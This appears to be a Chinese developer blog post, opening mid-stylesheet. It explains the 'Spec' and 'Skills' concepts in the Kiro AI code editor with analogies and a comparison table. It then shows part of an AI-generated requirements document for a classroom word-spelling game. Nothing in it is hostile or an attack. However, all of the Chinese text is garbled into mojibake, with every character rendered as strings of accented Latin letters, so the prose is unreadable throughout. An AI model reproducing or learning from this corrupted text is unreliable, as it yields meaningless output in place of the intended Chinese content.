li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>å‰ä¸¤å¤©åˆ·æ˜é‡‘ï¼Œçœ‹åˆ°ä¸€ç¯‡åä¸ºï¼š <a href="https://juejin.cn/post/7589466706377965604?searchId=202602040940541C1819DF56DC68AD34AE" target="_blank" title="https://juejin.cn/post/7589466706377965604?searchId=202602040940541C1819DF56DC68AD34AE">2025 Vibe Coding å…ƒå¹´ï¼šAI ç¼–ç¨‹çš„æŠ€æœ¯çªç ´å…¨æ™¯</a> çš„æ–‡ç« ï¼Œè¿™ç¯‡æ–‡ç« ä¸ä»…è¯¦ç»†å‰–æäº†è¿‘æ¥ç¼–ç¨‹é¢†åŸŸå¯èƒ½çš„å‘å±•è¶‹åŠ¿ï¼Œè¿˜æ„å¤–åœ°è®©æˆ‘æ¥è§¦åˆ°äº†ä¸¤ä¸ªæ–°çš„æ¦‚å¿µï¼š<code>Specï¼ˆè§„èŒƒï¼‰å’ŒSkillsï¼ˆæŠ€èƒ½ï¼‰</code>ã€‚åœ¨<code>AI</code>é£é€Ÿå‘å±•çš„ä»Šå¤©ï¼Œè¿™ä¸¤ä¸ªæ¦‚å¿µçš„å¼•å…¥æ˜¾å¾—å°¤ä¸ºé‡è¦ï¼Œå®ƒä»¬ä¸ä»…é¢„ç¤ºç€ç¼–ç¨‹è§„èŒƒçš„è¿›ä¸€æ­¥æ ‡å‡†åŒ–ï¼Œä¹Ÿä¸ºæŠ€èƒ½æå‡æä¾›äº†å…¨æ–°çš„è·¯å¾„ã€‚ä¸ºäº†è¿›ä¸€æ­¥ç†è§£è¿™ä¸¤ä¸ªæ¦‚å¿µçš„å®é™…åº”ç”¨ï¼Œæˆ‘åŠ¨æ‰‹è¿›è¡Œäº†å®è·µæ“ä½œï¼Œä¸‹é¢å°±æ˜¯æˆ‘å¯¹è¿™æ¬¡æ¢ç´¢çš„æ€»ç»“ä¸æ€è€ƒã€‚</p>
</blockquote>
<h2 data-id="heading-0">æˆ–è®¸æˆ‘ä»¬å¯ä»¥å®ç°ï¼šèµ‹èƒ½ <code>20%</code>çš„çš„é‡è¦ç¯èŠ‚ï¼Œæå‡æ•´ä½“ <code>80%</code>çš„æ•ˆèƒ½ï¼Ÿï¼Ÿï¼Ÿ</h2>
<h2 data-id="heading-1">ä¸€ã€ä½ åœ¨ç”¨ä»€ä¹ˆç¼–è¾‘å™¨ï¼Ÿ</h2>
<blockquote>
<p>æˆ‘çš„<code>AI</code>ç¼–è¾‘å™¨åœ¨ä»Šå¹´ä¸€å¹´å†…å°±æ¢äº†ä¸‰ä¸ªï¼Œæœ€å¼€å§‹æ˜¯<code>VScode</code>ï¼Œ ç„¶åæ˜¯ <code>Trae</code>ï¼Œç°åœ¨ä½¿ç”¨çš„æ˜¯<code>Kiro</code>ï¼Œè¿™ä¸€ä¸ªæœˆä½¿ç”¨ä¸‹æ¥ï¼Œè¿˜æ˜¯è›®é¡ºæ»‘çš„ï¼Œæ¨è ğŸ‘ã€‚</p>
</blockquote>
<p><img src="https://p9-juejin-sign.byteimg.com/tos-cn-i-k3u1fbpfcp/183be39e97f241f4a7a8861c66a770b2~tplv-k3u1fbpfcp-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546W5pyI5pm056m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226286&amp;x-signature=agBMNZtcAFcdlyEAbAL5mcndNUk%3D" alt="æœ€å¼€å§‹æ˜¯ç„¶.png" loading="lazy"/></p>
<p><strong>ä½œä¸º<code>claude</code>æ¨¡å‹çš„é‡‘ä¸»ï¼Œäºšé©¬é€Šçš„ <code>kiro</code>æ‹¥æœ‰<code>claude </code>çš„æœ€æ–°æ¨¡å‹:</strong></p>
<blockquote>
<p>æœ‰èµ„æ–™æ˜¾ç¤ºï¼šæˆªè‡³2026å¹´1æœˆï¼Œäºšé©¬é€Šå·²å‘<code>Anthropic</code>ï¼ˆå¼€å‘ <code>Claude</code> äººå·¥æ™ºèƒ½æ¨¡å‹çš„å…¬å¸ï¼‰ç´¯è®¡æŠ•èµ„<strong>80äº¿ç¾å…ƒ</strong>ï¼ˆ2023å¹´9æœˆé¦–æŠ•12.5äº¿ï¼Œ2024å¹´3æœˆè¿½åŠ 27.5äº¿ï¼Œ2024å¹´11æœˆå†æŠ•40äº¿ï¼‰</p>
</blockquote>
<p><img src="https://p9-juejin-sign.byteimg.com/tos-cn-i-k3u1fbpfcp/71d84c45fdbe42f9867148633e24add8~tplv-k3u1fbpfcp-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546W5pyI5pm056m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226286&amp;x-signature=tQldnN2jKJRssRCK4QqedOiFHJs%3D" alt="æˆªå±2026-02-04 16.49.07.png" loading="lazy"/></p>
<p>ä¸‹é¢çš„ç¤ºä¾‹éƒ½æ˜¯åŸºäºè¿™ä¸ª<code>Kiro ç¼–è¾‘å™¨</code>ï¼Œå½“ç„¶å…¶ä»–ç¼–è¾‘å™¨ä¹Ÿæœ‰ç±»ä¼¼çš„åŠŸèƒ½ï¼Œå°±éœ€è¦è‡ªè¡Œæ¢ç´¢äº†ï¼Œå·¥å…·æœ¬èº«å°±æ˜¯æœåŠ¡äºæˆ‘ä»¬çš„å·¥ä½œï¼Œä½¿ç”¨ä»€ä¹ˆå·¥å…·æ›´é¡ºæ‰‹å°±ç”¨å“ªä¸ªå–½ï¼</p>
<hr/>
<h2 data-id="heading-2">äºŒã€å…ˆæ¥äº†è§£å‡ ä¸ªå¸¸ç”¨çš„æ¦‚å¿µ</h2>
<h3 data-id="heading-3"><strong><code>Spec</code>å’Œ <code>Skills</code> çš„å…³ç³»</strong></h3>
<p><img src="https://p9-juejin-sign.byteimg.com/tos-cn-i-k3u1fbpfcp/d07731146022443cb822e20ce73489cf~tplv-k3u1fbpfcp-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546W5pyI5pm056m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226286&amp;x-signature=YUER3m%2By%2BgiievQRxPCytfmoAbA%3D" alt="ä½ç½®å›¾ç‰‡å·¦.png" loading="lazy"/></p>
<h3 data-id="heading-4">1. <code>Spec</code>â€Œæ ‡å‡†æ€§èƒ½è¯„ä¼°ç»„ç»‡ï¼Œè´Ÿè´£è§£é‡Šï¼š åšä»€ä¹ˆäº‹ï¼Ÿ</h3>
<p>â€Œ<strong>æ ¸å¿ƒç†å¿µâ€Œ</strong>ï¼šé‡‡ç”¨â€œå…ˆè®¡åˆ’ï¼Œåæ‰§è¡Œâ€çš„æµç¨‹ï¼Œè¦æ±‚AIåœ¨ç¼–å†™ä»£ç å‰ï¼Œå…ˆå°†ä»»åŠ¡ç†è§£ã€æŠ€æœ¯æ–¹æ¡ˆå’Œè¯¦ç»†æ‹†è§£å½¢æˆç»“æ„åŒ–æ–‡æ¡£ï¼ˆ<code>Docå’ŒTasks</code>ï¼‰ï¼Œç»äººå·¥ç¡®è®¤åå†ç”Ÿæˆä»£ç ã€‚ â€Œ</p>
<p><strong>ä¸»è¦ä½œç”¨â€Œ</strong>ï¼šå°†ä¼ ç»Ÿâ€œé»‘ç›’ç›´å‡ºâ€çš„ç¼–ç æ¨¡å¼å˜ä¸ºâ€œç™½ç›’åŒ–â€é˜¶æ®µæµç¨‹ï¼Œé€šè¿‡å¼•å…¥â€œéœ€ç¡®è®¤â€çš„ç¼“å†²é˜¶æ®µï¼Œå¤§å¹…å‡å°‘å› ç†è§£åå·®å¯¼è‡´çš„æ— æ•ˆå·¥ä½œå’Œè¿”å·¥ï¼Œæå‡ä»£ç ç”Ÿæˆçš„å‡†ç¡®æ€§ã€‚ â€Œ</p>
<p><strong>é€‚ç”¨åœºæ™¯â€Œ</strong>ï¼šé€‚ç”¨äºä»0åˆ°1çš„å¼€å‘ã€æŠ€æœ¯æ–¹æ¡ˆåŸå‹äº§å‡ºã€å›¢é˜Ÿå†…éƒ¨è·¨è§’è‰²ï¼ˆå¦‚äº§å“ã€å‰åç«¯ï¼‰æ²Ÿé€šåä½œç­‰åœºæ™¯ã€‚</p>
<p><strong><code>å°±åƒé¡¹ç›®éœ€æ±‚æ–‡æ¡£ã€ä»»åŠ¡æ¸…å•ï¼Œå¤§ç™½è¯è®²ï¼šå°±æ˜¯ä½ ç»™æˆ‘ä¸€ä¸ªæ–‡ä»¶ï¼Œå‘Šè¯‰æˆ‘è¿™ä¸ªé¡¹ç›®æ€ä¹ˆåš</code></strong></p>
<p><img src="https://p9-juejin-sign.byteimg.com/tos-cn-i-k3u1fbpfcp/6de447b9cdbd4827b825c32aeffa5aa1~tplv-k3u1fbpfcp-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546W5pyI5pm056m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226286&amp;x-signature=J6FmefurijxSZNadGi7nz%2FA7sak%3D" alt="20260205-105320.jpeg" loading="lazy"/></p>
<h3 data-id="heading-5">2. <code>Skills</code> ä¸­æ–‡è§£é‡Šâ€œæŠ€èƒ½â€ï¼Œå°±æ˜¯æ•™æˆ‘"æ€ä¹ˆåšäº‹"çš„è§„åˆ™æ‰‹å†Œã€‚</h3>
<blockquote>
<p>å°±åƒæˆ‘æ¯æ¬¡å’Œ<code>AI</code>å¯¹è¯æ—¶ï¼Œæ€»æœ‰ä¸€äº›ç‰¹å®šçš„è§„åˆ™å‰æï¼Œä¸åŒçš„è§„åˆ™å¯¹åº”ä¸åŒçš„<code>prompt</code>ï¼Œæ ¹æ®å…³é”®è¯æ¥è§¦å‘æˆ‘ä½¿ç”¨å“ªä¸ªå†…ç½®çš„<code>prompt</code>ï¼Œä¹Ÿå¯ä»¥è®¾ç½®æ¯æ¬¡å¯¹è¯éƒ½å¼•å…¥ï¼Œæ¯”å¦‚ä¸‹å›¾ï¼š</p>
</blockquote>
<p><img src="https://p9-juejin-sign.byteimg.com/tos-cn-i-k3u1fbpfcp/ee0e0a1a4a974f79a66d72b744518f10~tplv-k3u1fbpfcp-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546W5pyI5pm056m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226286&amp;x-signature=4UFnXd8xtHO2ENkNpcH4S048RUA%3D" alt="å°±åƒä½ æ•™ä¸€.png" loading="lazy"/></p>
<h3 data-id="heading-6">3. ä¸¤è€…çš„å…³ç³»</h3>
<p>ç±»æ¯” 1: åšèœ ğŸ³</p>
<p><img src="https://p9-juejin-sign.byteimg.com/tos-cn-i-k3u1fbpfcp/b347a6ae36fc4a09baab93667aee3eaa~tplv-k3u1fbpfcp-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546W5pyI5pm056m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226286&amp;x-signature=Q8PY5cHFvO7wRJ4ilG3xseckn6A%3D" alt="ç±»æ¯”çš„æ­¥éª¤.png" loading="lazy"/></p>
<blockquote>
<p>å…³ç³»ï¼šç”¨çƒ¹é¥ªæŠ€å·§ï¼ˆSkillsï¼‰æ¥å®Œæˆèœè°±ï¼ˆSpecï¼‰
ä¸€ä¸ªæŠ€å·§å¯ä»¥ç”¨åœ¨å¾ˆå¤šèœè°±ä¸Šï¼Œä¸€ä¸ªèœè°±éœ€è¦ç”¨åˆ°å¤šä¸ªæŠ€å·§</p>
</blockquote>
<p>ç±»æ¯” 2: ç›–æˆ¿å­ ğŸ—ï¸</p>
<p><img src="https://p9-juejin-sign.byteimg.com/tos-cn-i-k3u1fbpfcp/497306bf31574fe29c00fe52f7c95c3b~tplv-k3u1fbpfcp-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546W5pyI5pm056m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226286&amp;x-signature=kGOyfIb7iWYmQkiI%2B8A%2BDmgoJbg%3D" alt="ç±»æ¯”çš„æ­¥éª¤ (1).png" loading="lazy"/></p>
<blockquote>
<p>å…³ç³»ï¼š
æŒ‰ç…§æ–½å·¥è§„èŒƒï¼ˆ<code>Skills</code>ï¼‰æ¥å®ç°å»ºç­‘å›¾çº¸ï¼ˆ<code>Spec</code>ï¼‰
è§„èŒƒæ˜¯é€šç”¨çš„ï¼Œå¯ä»¥ç›–å¾ˆå¤šæˆ¿å­
å›¾çº¸æ˜¯å…·ä½“çš„ï¼Œåªé’ˆå¯¹è¿™ä¸€æ ‹æˆ¿å­</p>
</blockquote>
<hr/>
<h3 data-id="heading-7">4. å®é™…çš„å·¥ä½œæµç¨‹-ç†è®º</h3>
<p><strong>å‡è®¾åœºæ™¯ï¼šæˆ‘ä»¬è¦å¼€å‘å­—æ¯æ‹¼å†™æ¸¸æˆ</strong></p>
<p><strong>1. ä½ æœ‰ä¸€ä¸ª Specï¼ˆéœ€æ±‚æ–‡æ¡£ï¼‰ğŸ“‹ "åˆ›å»ºå­—æ¯æ‹¼å†™æ¸¸æˆ"</strong></p>
<ul>
<li>éœ€è¦æ¸¸æˆç»„ä»¶</li>
<li>éœ€è¦æ¸¸æˆæ¥å£</li>
<li>éœ€è¦çŠ¶æ€ç®¡ç†</li>
</ul>
<p><strong>2. æˆ‘ä½¿ç”¨ Skillsï¼ˆè§„åˆ™ï¼‰æ¥å®ç°</strong></p>
<p><strong>åˆ›å»ºç»„ä»¶æ—¶ â†’ åº”ç”¨ "React ç»„ä»¶ç”Ÿæˆ Skill"</strong></p>
<p>âœ… æŒ‰è§„èŒƒåˆ›å»ºæ–‡ä»¶ç»“æ„</p>
<p>âœ… æŒ‰æ¨¡æ¿ç”Ÿæˆä»£ç </p>
<p>âœ… éµå¾ªå‘½åè§„èŒƒ</p>
<p><strong>æ·»åŠ æ¥å£æ—¶ â†’ åº”ç”¨ "API æ¥å£ç”Ÿæˆ Skill"</strong></p>
<p>âœ… æ£€æŸ¥æ˜¯å¦é‡å¤</p>
<p>âœ… æ·»åŠ ç±»å‹å®šä¹‰</p>
<p>âœ… æ·»åŠ å®Œæ•´æ³¨é‡Š</p>
<p><strong>å®Œæˆå â†’ åº”ç”¨ "ä»£ç æ£€æŸ¥ Skill"</strong></p>
<p>âœ… æ£€æŸ¥é€»è¾‘é—®é¢˜</p>
<p>âœ… æ£€æŸ¥æ€§èƒ½é—®é¢˜</p>
<p>âœ… æ£€æŸ¥æ˜¯å¦æœ‰é‡å¤ä»£ç </p>
<p><strong>3. å®Œæˆ Specâœ… å­—æ¯æ‹¼å†™æ¸¸æˆå¼€å‘å®Œæˆ ğŸ“Š å¯¹æ¯”è¡¨æ ¼</strong></p>


















































<table><thead><tr><th>ç»´åº¦</th><th>Skillsï¼ˆæŠ€èƒ½ï¼‰</th><th>Specï¼ˆè§„æ ¼ï¼‰</th></tr></thead><tbody><tr><td>æ˜¯ä»€ä¹ˆ</td><td>åšäº‹çš„æ–¹æ³•</td><td>è¦åšçš„äº‹æƒ…</td></tr><tr><td>ä½œç”¨</td><td>æ•™æˆ‘æ€ä¹ˆåš</td><td>å‘Šè¯‰æˆ‘åšä»€ä¹ˆ</td></tr><tr><td>èŒƒå›´</td><td>é€šç”¨çš„</td><td>å…·ä½“çš„</td></tr><tr><td>æ—¶æ•ˆ</td><td>é•¿æœŸæœ‰æ•ˆ</td><td>ä¸€æ¬¡æ€§çš„</td></tr><tr><td>æ•°é‡</td><td>å°‘é‡ï¼ˆ3-10ä¸ªï¼‰</td><td>å¾ˆå¤šï¼ˆæ¯ä¸ªåŠŸèƒ½ä¸€ä¸ªï¼‰</td></tr><tr><td>ä½ç½®</td><td>.kiro/steering/</td><td>.kiro/specs/</td></tr><tr><td>ä¾‹å­</td><td>"ç»„ä»¶åˆ›å»ºè§„èŒƒ"</td><td>"åˆ›å»ºç™»å½•é¡µé¢"</td></tr><tr><td>å¤ç”¨</td><td>å¯ä»¥å¤ç”¨åˆ°å…¶ä»–é¡¹ç›®</td><td>åªé’ˆå¯¹å½“å‰åŠŸèƒ½</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-8">ä¸‰ã€ä¸‹é¢å°±è®©æˆ‘ä»¬ç”¨å®é™…çš„<code>AIç¼–è¾‘å™¨</code>æ¥è¯•è¯•ä¸Šé¢èƒ½åŠ›-å®è·µï¼š</h2>
<blockquote>
<p>åœ¨ä¸Šé¢æˆ‘ä»¬è®¨è®ºäº†ä»–ä»¬ä¹‹é—´çš„å…³ç³»ï¼Œå¹¶ä½¿ç”¨ç¤ºä¾‹å›¾çš„å½¢å¼å±•ç°å‡ºæ¥ï¼Œä¸‹é¢å°±æ˜¯å…·ä½“çš„å®è·µç¤ºä¾‹ã€‚</p>
</blockquote>
<p><strong>é¦–å…ˆæ˜¯-çœæµæœ€å°ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash">.kiro/steering/
  â”œâ”€â”€ react-component-generator.md  â† <span class="hljs-string">"æ€ä¹ˆåˆ›å»ºç»„ä»¶"</span>
  â”œâ”€â”€ api-service-generator.md      â† <span class="hljs-string">"æ€ä¹ˆæ·»åŠ æ¥å£"</span>
  â””â”€â”€ code-review.md                â† <span class="hljs-string">"æ€ä¹ˆæ£€æŸ¥ä»£ç "</span>
Spec çš„ä¾‹å­ï¼ˆå…·ä½“éœ€æ±‚ï¼‰
.kiro/specs/
  â””â”€â”€ letter-spelling-game/
      â””â”€â”€ requirements.md           â† <span class="hljs-string">"åšä¸€ä¸ªå­—æ¯æ‹¼å†™æ¸¸æˆ"</span>   
</code></pre>
<hr/>
<p><strong>æ¥ä¸‹æ¥æ˜¯ä½¿ç”¨<code>Kiro</code>çš„å…·ä½“æ“ä½œæ¼”ç¤ºæ­¥éª¤ï¼š</strong></p>
<h3 data-id="heading-9">1. å…ˆæ¥çœ‹ <code>Spec</code></h3>
<h4 data-id="heading-10">ï¼ˆ1ï¼‰å‘é€æŒ‡ä»¤å‰ï¼Œå…ˆé€‰æ‹©<code>Spec</code>æ¨¡å¼ï¼š</h4>
<p><img src="https://p9-juejin-sign.byteimg.com/tos-cn-i-k3u1fbpfcp/6ccda9283c624484ba82efe59fe2a05b~tplv-k3u1fbpfcp-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546W5pyI5pm056m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226286&amp;x-signature=lT54zS%2FRCF%2BaqEwmpB1PxUa32Do%3D" alt="æˆªå±2026-02-04 17.08.35.png" loading="lazy"/></p>
<h4 data-id="heading-11">ï¼ˆ2ï¼‰æå‡ºæˆ‘çš„éœ€æ±‚</h4>
<blockquote>
<p><code>prompt</code>: æˆ‘æƒ³åˆ›å»ºä¸€ä¸ªè¯¾å ‚äº’åŠ¨å°æ¸¸æˆï¼Œæ ¹æ®å­—æ¯æ‹¼å•è¯ï¼Œå¸®æˆ‘å®ç°ã€‚</p>
</blockquote>
<p><img src="https://p9-juejin-sign.byteimg.com/tos-cn-i-k3u1fbpfcp/093fd4f626ae43aeaa8fc7dfa0c953ad~tplv-k3u1fbpfcp-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546W5pyI5pm056m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226286&amp;x-signature=Z66pQWGULZrpB6jpCCiRGnnbOWo%3D" alt="æˆªå±2026-02-04 17.23.49.png" loading="lazy"/></p>
<h4 data-id="heading-12">ï¼ˆ3ï¼‰ç”Ÿæˆå…·ä½“çš„éœ€æ±‚æ–‡æ¡£</h4>
<blockquote>
<p>æäº¤æç¤ºè¯ï¼Œç”Ÿæˆå…·ä½“çš„éœ€æ±‚æ–‡æ¡£ï¼š</p>
</blockquote>
<p><img src="https://p9-juejin-sign.byteimg.com/tos-cn-i-k3u1fbpfcp/0510f6107e10460382ad7e38c50107a5~tplv-k3u1fbpfcp-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546W5pyI5pm056m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226286&amp;x-signature=tPdGPb2x4vTxEHCla55XlRFVICU%3D" alt="æˆªå±2026-02-04 17.25.58.png" loading="lazy"/></p>
<p><strong>ç”Ÿæˆå®Œæˆï¼š</strong></p>
<p><img src="https://p9-juejin-sign.byteimg.com/tos-cn-i-k3u1fbpfcp/5512c98331984e5fa779a4b8cc31c728~tplv-k3u1fbpfcp-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546W5pyI5pm056m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771226286&amp;x-signature=wK37hojmP4%2F3TBzPNMt%2FmeO6dE0%3D" alt="æˆªå±2026-02-04 17.27.14.png" loading="lazy"/></p>
<p><strong>ä¸‹é¢çš„æ–‡æ¡£æˆ‘åªæˆªå–äº†å¤´éƒ¨å’Œå°¾éƒ¨çš„éƒ¨åˆ†ï¼Œå¤§å®¶å¯ä»¥è‡ªå·±åŠ¨æ‰‹å°è¯•ä¸€ä¸‹ï¼š</strong></p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">éœ€æ±‚æ–‡æ¡£</span>
<span class="hljs-meta prompt_">
#</span><span class="bash"><span class="hljs-comment"># ç®€ä»‹</span></span>

è¯¾å ‚æ‹¼å†™æ¸¸æˆæ˜¯ä¸€ä¸ªæ•™è‚²ç±»äº’åŠ¨åº”ç”¨ï¼Œæ—¨åœ¨å¸®åŠ©å­¦ç”Ÿé€šè¿‡æ¸¸æˆåŒ–çš„æ–¹å¼å­¦ä¹ å’Œç»ƒä¹ è‹±è¯­å•è¯æ‹¼å†™ã€‚ç³»ç»Ÿä¼šæä¾›ä¸€ç»„æ‰“ä¹±é¡ºåºçš„å­—æ¯ï¼Œå­¦ç”Ÿéœ€è¦å°†è¿™äº›å­—æ¯é‡æ–°æ’åˆ—ç»„æˆæ­£ç¡®çš„å•è¯ã€‚
<span class="hljs-meta prompt_">
#</span><span class="bash"><span class="hljs-comment"># æœ¯è¯­è¡¨</span></span>

- **æ¸¸æˆç³»ç»Ÿï¼ˆGame_Systemï¼‰**: ç®¡ç†æ¸¸æˆæµç¨‹ã€é¢˜ç›®ç”Ÿæˆå’Œç­”æ¡ˆéªŒè¯çš„æ ¸å¿ƒç³»ç»Ÿ
- **é¢˜ç›®ï¼ˆQuestionï¼‰**: åŒ…å«ç›®æ ‡å•è¯å’Œæ‰“ä¹±å­—æ¯çš„æ¸¸æˆé—®é¢˜
- **å•è¯åº“ï¼ˆWord_Bankï¼‰**: å­˜å‚¨å¯ç”¨äºæ¸¸æˆçš„å•è¯é›†åˆ
- **å­¦ç”Ÿï¼ˆStudentï¼‰**: å‚ä¸æ¸¸æˆçš„ç”¨æˆ·
- **å›åˆï¼ˆRoundï¼‰**: ä¸€æ¬¡å®Œæ•´çš„ç­”é¢˜è¿‡ç¨‹ï¼Œä»æ˜¾ç¤ºé¢˜ç›®åˆ°æäº¤ç­”æ¡ˆ
- **å¾—åˆ†ç³»ç»Ÿï¼ˆScoring_Systemï¼‰**: è®¡ç®—å’Œè®°å½•å­¦ç”Ÿè¡¨ç°çš„ç³»ç»Ÿ
<span class="hljs-meta prompt_">
#</span><span class="bash"><span class="hljs-comment"># éœ€æ±‚</span></span>
<span class="hljs-meta prompt_">
#</span><span class="bash"><span class="hljs-comment">## éœ€æ±‚ 1ï¼šé¢˜ç›®ç”Ÿæˆ</span></span>

**ç”¨æˆ·æ•…äº‹ï¼š** ä½œä¸ºæ•™å¸ˆï¼Œæˆ‘å¸Œæœ›ç³»ç»Ÿèƒ½å¤Ÿè‡ªåŠ¨ç”Ÿæˆæ‹¼å†™é¢˜ç›®ï¼Œä»¥ä¾¿å­¦ç”Ÿè¿›è¡Œç»ƒä¹ ã€‚
<span class="hljs-meta prompt_">
#</span><span class="bash"><span class="hljs-comment">### éªŒæ”¶æ ‡å‡†</span></span>

1. å½“æ¸¸æˆå¼€å§‹æ—¶ï¼Œæ¸¸æˆç³»ç»Ÿåº”å½“ä»å•è¯åº“ä¸­éšæœºé€‰æ‹©ä¸€ä¸ªå•è¯
2. å½“é€‰æ‹©å•è¯åï¼Œæ¸¸æˆç³»ç»Ÿåº”å½“å°†å•è¯çš„å­—æ¯æ‰“ä¹±é¡ºåº
3. å½“æ‰“ä¹±å­—æ¯æ—¶ï¼Œæ¸¸æˆç³»ç»Ÿåº”å½“ç¡®ä¿æ‰“ä¹±åçš„å­—æ¯é¡ºåºä¸åŸå•è¯ä¸åŒ
4. å½“ç”Ÿæˆé¢˜ç›®æ—¶ï¼Œæ¸¸æˆç³»ç»Ÿåº”å½“åŒæ—¶ä¿å­˜åŸå§‹å•è¯ä½œä¸ºæ­£ç¡®ç­”æ¡ˆ
<span class="hljs-meta prompt_">
#</span><span class="bash"><span class="hljs-comment">## éœ€æ±‚ 2ï¼šç­”æ¡ˆæäº¤ä¸éªŒè¯</span></span>

**ç”¨æˆ·æ•…äº‹ï¼š** ä½œä¸ºå­¦ç”Ÿï¼Œæˆ‘å¸Œæœ›èƒ½å¤Ÿæäº¤æˆ‘çš„ç­”æ¡ˆå¹¶ç«‹å³çŸ¥é“æ˜¯å¦æ­£ç¡®ï¼Œä»¥ä¾¿è·å¾—å³æ—¶åé¦ˆã€‚
<span class="hljs-meta prompt_">
#</span><span class="bash"><span class="hljs-comment">### éªŒæ”¶æ ‡å‡†</span></span>

1. å½“å­¦ç”Ÿè¾“å…¥ç­”æ¡ˆæ—¶ï¼Œæ¸¸æˆç³»ç»Ÿåº”å½“æ¥å—å­—æ¯è¾“å…¥
2. å½“å­¦ç”Ÿæäº¤ç­”æ¡ˆæ—¶ï¼Œæ¸¸æˆç³»ç»Ÿåº”å½“éªŒè¯ç­”æ¡ˆæ˜¯å¦ä¸æ­£ç¡®å•è¯å®Œå…¨åŒ¹é…
3. å¦‚æœç­”æ¡ˆæ­£ç¡®ï¼Œé‚£ä¹ˆæ¸¸æˆç³»ç»Ÿåº”å½“æ˜¾ç¤ºæˆåŠŸæç¤ºå¹¶å¢åŠ å¾—åˆ†
4. å¦‚æœç­”æ¡ˆé”™è¯¯ï¼Œé‚£ä¹ˆæ¸¸æˆç³»ç»Ÿåº”å½“æ˜¾ç¤ºé”™è¯¯æç¤ºå¹¶å…è®¸é‡è¯•
5. å½“éªŒè¯ç­”æ¡ˆæ—¶ï¼Œæ¸¸æˆç³»ç»Ÿåº”å½“å¿½ç•¥å¤§å°å†™å·®å¼‚
..................
..................
..................
<span class="hljs-meta prompt_">#</span><span class="bash"><span class="hljs-comment">## éœ€æ±‚ 12ï¼šå“åº”å¼è®¾è®¡</span></span>

**ç”¨æˆ·æ•…äº‹ï¼š** ä½œä¸ºæ•™å¸ˆï¼Œæˆ‘æƒ³è¦æ¸¸æˆåœ¨ä¸åŒè®¾å¤‡ä¸Šéƒ½èƒ½æ­£å¸¸æ˜¾ç¤ºï¼Œä»¥ä¾¿åœ¨å„ç§æ•™å­¦ç¯å¢ƒä¸­ä½¿ç”¨ã€‚
<span class="hljs-meta prompt_">
#</span><span class="bash"><span class="hljs-comment">### éªŒæ”¶æ ‡å‡†</span></span>

1. å½“æ¸¸æˆåœ¨å¤§å±å¹•æ˜¾ç¤ºæ—¶ï¼ˆ1920x1080æˆ–æ›´é«˜ï¼‰ï¼Œæ¸¸æˆç³»ç»Ÿåº”å½“ä¼˜åŒ–å¸ƒå±€ä»¥å……åˆ†åˆ©ç”¨å±å¹•ç©ºé—´
2. å½“æ¸¸æˆåœ¨å¹³æ¿è®¾å¤‡æ˜¾ç¤ºæ—¶ï¼Œæ¸¸æˆç³»ç»Ÿåº”å½“è°ƒæ•´å­—æ¯æŒ‰é’®å¤§å°å’Œé—´è·ä»¥é€‚åº”è§¦æ‘¸æ“ä½œ
3. å½“æ¸¸æˆåœ¨å°å±å¹•è®¾å¤‡æ˜¾ç¤ºæ—¶ï¼ˆæ‰‹æœºï¼‰ï¼Œæ¸¸æˆç³»ç»Ÿåº”å½“é‡‡ç”¨å‚ç›´å¸ƒå±€å¹¶è°ƒæ•´å­—ä½“å¤§å°
4. å½“å±å¹•æ–¹å‘æ”¹å˜æ—¶ï¼Œæ¸¸æˆç³»ç»Ÿåº”å½“åœ¨500æ¯«ç§’å†…é‡æ–°å¸ƒå±€ç•Œé¢å…ƒç´ 
